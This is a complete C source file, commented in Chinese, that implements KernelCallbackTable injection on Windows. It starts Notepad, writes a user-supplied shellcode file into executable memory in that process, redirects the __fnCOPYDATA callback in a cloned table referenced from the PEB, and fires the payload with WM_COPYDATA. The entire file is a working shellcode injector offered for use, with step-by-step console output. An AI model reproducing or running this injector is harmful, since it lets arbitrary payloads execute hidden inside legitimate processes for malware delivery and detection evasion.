/**
 * ===================================================================
 * Kernel Callback Table Injection
 * ===================================================================
 *
 * 原理：劫持 PEB 中的 KernelCallbackTable 执行 shellcode
 *
 * PEB (Process Environment Block) 包含 KernelCallbackTable 指针（偏移 0x58）
 * KernelCallbackTable 是一个函数指针数组，由 user32.dll 初始化
 * 这些函数处理 Windows 消息（如 WM_COPYDATA）
 *
 * 注入流程：
 * 1. 创建目标进程（GUI 进程，如 Notepad）
 * 2. 通过 NtQueryInformationProcess 获取 PEB 地址
 * 3. 读取 PEB->KernelCallbackTable
 * 4. 分配远程内存写入 shellcode
 * 5. 克隆 KernelCallbackTable，修改 __fnCOPYDATA 指向 shellcode
 * 6. 更新 PEB->KernelCallbackTable 指向修改后的表
 * 7. 发送 WM_COPYDATA 消息触发执行
 *
 * 参考：
 * - MITRE ATT&CK: T1574.013 (Hijack Execution Flow: KernelCallbackTable)
 * - https://github.com/0xHossam/KernelCallbackTable-Injection-PoC
 */

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// ===== KernelCallbackTable 结构 =====
// 这个结构包含大量函数指针，处理各种 Windows 消息
// 我们只关心前几个，特别是 __fnCOPYDATA
typedef struct _KERNEL_CALLBACK_TABLE {
    ULONG_PTR __fnCOPYDATA;          // 处理 WM_COPYDATA
    ULONG_PTR __fnCOPYGLOBALDATA;
    ULONG_PTR __fnDWORD;
    ULONG_PTR __fnNCDESTROY;
    ULONG_PTR __fnDWORDOPTINLPMSG;
    // ... 还有很多其他回调函数
    // 为简化起见，我们只定义前几个
} KERNEL_CALLBACK_TABLE, *PKERNEL_CALLBACK_TABLE;

// ===== NT API 类型定义 =====
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

/**
 * ===================================================================
 * 启用调试权限
 * ===================================================================
 */
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    printf("[*] Enabling Debug Privilege...\n");

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] Failed to open process token (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
        printf("[-] Failed to lookup privilege value (Error: %lu)\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        printf("[-] Failed to adjust token privileges (Error: %lu)\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    printf("[+] Debug Privilege enabled\n");
    return TRUE;
}

/**
 * ===================================================================
 * 加载 NtQueryInformationProcess
 * ===================================================================
 */
pNtQueryInformationProcess LoadNtQueryInformationProcess() {
    printf("[*] Loading NtQueryInformationProcess...\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll.dll handle\n");
        return NULL;
    }

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        printf("[-] Failed to resolve NtQueryInformationProcess\n");
        return NULL;
    }

    printf("[+] NtQueryInformationProcess loaded at: 0x%p\n", NtQueryInformationProcess);
    return NtQueryInformationProcess;
}

/**
 * ===================================================================
 * 读取文件到内存
 * ===================================================================
 */
BOOL ReadFileToMemory(const char* fileName, PVOID* buffer, DWORD* length) {
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open file: %s (Error: %lu)\n", fileName, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[-] Failed to get file size (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    *buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
    if (!*buffer) {
        printf("[-] Failed to allocate memory\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[-] Failed to read file (Error: %lu)\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, *buffer);
        CloseHandle(hFile);
        return FALSE;
    }

    *length = fileSize;
    CloseHandle(hFile);
    return TRUE;
}

/**
 * ===================================================================
 * Kernel Callback Table 注入
 * ===================================================================
 */
BOOL KernelCallbackTableInject(const char* targetProcess, PVOID payload, DWORD payloadSize) {
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {sizeof(si)};
    HWND hWindow = NULL;
    HANDLE hProcess = NULL;
    BOOL success = FALSE;
    pNtQueryInformationProcess NtQueryInformationProcess = NULL;

    printf("\n===================================================================\n");
    printf("Kernel Callback Table Injection\n");
    printf("===================================================================\n\n");

    printf("[*] Target Process: %s\n", targetProcess);
    printf("[*] Payload Size: %lu bytes\n\n", payloadSize);

    // 第一步：加载 NT API
    printf("[*] Step 1: Loading NT APIs...\n");
    NtQueryInformationProcess = LoadNtQueryInformationProcess();
    if (!NtQueryInformationProcess) {
        goto CLEANUP;
    }

    // 第二步：创建目标进程（挂起状态，可见窗口）
    printf("\n[*] Step 2: Creating target process...\n");
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    if (!CreateProcessA(NULL, (LPSTR)targetProcess, NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create process (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Process created (PID: %lu)\n", pi.dwProcessId);

    // 第三步：等待进程初始化
    printf("\n[*] Step 3: Waiting for process initialization...\n");
    WaitForInputIdle(pi.hProcess, 2000);
    Sleep(500); // 额外等待确保窗口创建

    // 第四步：查找窗口句柄
    printf("\n[*] Step 4: Finding window handle...\n");
    DWORD waitTime = 0;
    const DWORD MAX_WAIT = 10000;

    while (!hWindow && waitTime < MAX_WAIT) {
        hWindow = FindWindowA("Notepad", NULL);
        if (!hWindow) {
            Sleep(500);
            waitTime += 500;
        }
    }

    if (!hWindow) {
        printf("[-] Failed to find window after %lu ms\n", MAX_WAIT);
        goto CLEANUP;
    }
    printf("[+] Window handle found: 0x%p\n", hWindow);

    // 第五步：获取进程 ID 和句柄
    printf("\n[*] Step 5: Opening process handle...\n");
    DWORD pid;
    GetWindowThreadProcessId(hWindow, &pid);
    printf("[+] Process ID: %lu\n", pid);

    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                          PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                          FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Process handle: 0x%p\n", hProcess);

    // 第六步：获取 PEB 地址
    printf("\n[*] Step 6: Retrieving PEB address...\n");
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation,
                                               &pbi, sizeof(pbi), &returnLength);
    if (status != 0) {
        printf("[-] NtQueryInformationProcess failed (Status: 0x%lX)\n", status);
        goto CLEANUP;
    }
    PVOID pebAddress = pbi.PebBaseAddress;
    printf("[+] PEB Address: 0x%p\n", pebAddress);

    // 第七步：读取 KernelCallbackTable
    printf("\n[*] Step 7: Reading KernelCallbackTable...\n");
    PVOID kernelCallbackTableAddr;
    SIZE_T bytesRead;

    // PEB 偏移 0x58 是 KernelCallbackTable
    if (!ReadProcessMemory(hProcess, (PBYTE)pebAddress + 0x58,
                          &kernelCallbackTableAddr, sizeof(PVOID), &bytesRead)) {
        printf("[-] Failed to read KernelCallbackTable address (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] KernelCallbackTable Address: 0x%p\n", kernelCallbackTableAddr);

    // 读取 KernelCallbackTable 内容
    KERNEL_CALLBACK_TABLE originalTable = {0};
    if (!ReadProcessMemory(hProcess, kernelCallbackTableAddr, &originalTable,
                          sizeof(originalTable), &bytesRead)) {
        printf("[-] Failed to read KernelCallbackTable (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Original __fnCOPYDATA: 0x%p\n", (PVOID)originalTable.__fnCOPYDATA);

    // 第八步：分配远程内存并写入 payload
    printf("\n[*] Step 8: Allocating remote memory for payload...\n");
    LPVOID remotePayload = VirtualAllocEx(hProcess, NULL, payloadSize,
                                         MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remotePayload) {
        printf("[-] Failed to allocate remote memory (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Remote payload buffer: 0x%p\n", remotePayload);

    if (!WriteProcessMemory(hProcess, remotePayload, payload, payloadSize, NULL)) {
        printf("[-] Failed to write payload (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Payload written (%lu bytes)\n", payloadSize);

    // 第九步：修改 KernelCallbackTable
    printf("\n[*] Step 9: Modifying KernelCallbackTable...\n");
    KERNEL_CALLBACK_TABLE modifiedTable = originalTable;
    modifiedTable.__fnCOPYDATA = (ULONG_PTR)remotePayload;
    printf("[+] Modified __fnCOPYDATA to point to: 0x%p\n", remotePayload);

    // 第十步：克隆修改后的表到远程进程
    printf("\n[*] Step 10: Cloning modified KernelCallbackTable...\n");
    LPVOID remoteTable = VirtualAllocEx(hProcess, NULL, sizeof(modifiedTable),
                                       MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remoteTable) {
        printf("[-] Failed to allocate memory for table (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }

    if (!WriteProcessMemory(hProcess, remoteTable, &modifiedTable,
                           sizeof(modifiedTable), NULL)) {
        printf("[-] Failed to write modified table (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Modified table written to: 0x%p\n", remoteTable);

    // 第十一步：更新 PEB 中的 KernelCallbackTable 指针
    printf("\n[*] Step 11: Updating PEB->KernelCallbackTable...\n");
    if (!WriteProcessMemory(hProcess, (PBYTE)pebAddress + 0x58,
                           &remoteTable, sizeof(PVOID), &bytesRead)) {
        printf("[-] Failed to update PEB (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] PEB->KernelCallbackTable updated successfully\n");

    // 第十二步：触发 payload
    printf("\n[*] Step 12: Triggering payload via WM_COPYDATA...\n");
    COPYDATASTRUCT cds;
    WCHAR msg[] = L"Trigger";
    cds.dwData = 1;
    cds.cbData = (lstrlenW(msg) + 1) * sizeof(WCHAR);
    cds.lpData = msg;

    LRESULT result = SendMessageW(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
    if (result == 0 && GetLastError() != 0) {
        printf("[-] Failed to send message (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Payload triggered!\n");

    printf("\n===================================================================\n");
    printf("[+] Injection completed successfully!\n");
    printf("===================================================================\n");

    success = TRUE;

CLEANUP:
    printf("\n[*] Cleaning up...\n");
    if (hProcess) {
        CloseHandle(hProcess);
    }
    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }

    return success;
}

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("===================================================================\n");
    printf("Kernel Callback Table Injection\n");
    printf("Based on: github.com/0xHossam/KernelCallbackTable-Injection-PoC\n");
    printf("MITRE ATT&CK: T1574.013\n");
    printf("===================================================================\n\n");

    if (argc < 2) {
        printf("Usage: %s <payload.bin>\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s payload.bin\n", argv[0]);
        printf("\nNote: This will create a Notepad process as the target.\n");
        return 1;
    }

    // 启用调试权限
    if (!EnableDebugPrivilege()) {
        printf("[-] Warning: Could not enable debug privilege\n");
    }

    // 读取 payload
    PVOID payload = NULL;
    DWORD payloadSize = 0;

    if (!ReadFileToMemory(argv[1], &payload, &payloadSize)) {
        return 1;
    }

    printf("[+] Payload loaded: %lu bytes\n", payloadSize);

    // 执行注入
    BOOL result = KernelCallbackTableInject("C:\\Windows\\System32\\notepad.exe",
                                           payload, payloadSize);

    // 清理
    if (payload) {
        HeapFree(GetProcessHeap(), 0, payload);
    }

    if (!result) {
        printf("\n[-] Injection failed!\n");
        return 1;
    }

    printf("\n[*] Press Enter to exit...\n");
    getchar();

    return 0;
}
